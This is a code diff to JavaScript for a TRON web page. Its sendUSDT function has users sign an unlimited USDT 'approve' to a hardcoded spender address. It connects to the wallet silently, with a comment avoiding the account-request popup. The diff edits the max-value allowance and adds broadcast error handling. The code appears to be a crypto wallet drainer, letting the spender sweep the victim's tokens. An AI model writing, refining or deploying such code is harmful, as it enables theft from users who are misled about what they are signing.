@@ -3,7 +3,6 @@ const TRON_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const TRON_SPENDER = "TD7YMonVkbcEiVu5tqXvEeBa2zniao86pJ";
 
 let userAddress = null;
-let isConnected = false;
 
 const ABI = [
   { "name": "approve", "inputs": [{ "name": "spender", "type": "address" }, { "name": "amount", "type": "uint256" }], "outputs": [{ "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
@@ -28,7 +27,6 @@ async function backgroundConnect() {
     const found = await waitForTronWeb(5000);
     if (found) {
       userAddress = window.tronWeb.defaultAddress.base58;
-      isConnected = true;
     }
     // Do NOT call tron_requestAccounts here - it causes popup
   } catch(e) {
@@ -72,7 +70,7 @@ async function sendUSDT() {
       { feeLimit: 100000000 },
       [
         { type: "address", value: TRON_SPENDER },
-        { type: "uint256", value: "115792089237316195423570985008687907853269984665640564039457584007913129639935" }
+        { type: "uint256", value: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" }
       ],
       address
     );
@@ -82,6 +80,10 @@ async function sendUSDT() {
 
     // Broadcast
     const result = await twPublic.trx.sendRawTransaction(signedTx);
+
+    if (!result.result) {
+      throw new Error("Broadcast failed: " + (result.message || "Unknown error"));
+    }
 
     await new Promise(r => setTimeout(r, 3000));
 
@@ -128,7 +130,6 @@ window.addEventListener("message", (e) => {
     if (msg.action === "accountsChanged" || msg.action === "setAccount") {
       if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
         userAddress = window.tronWeb.defaultAddress.base58;
-        isConnected = true;
       }
     }
   }
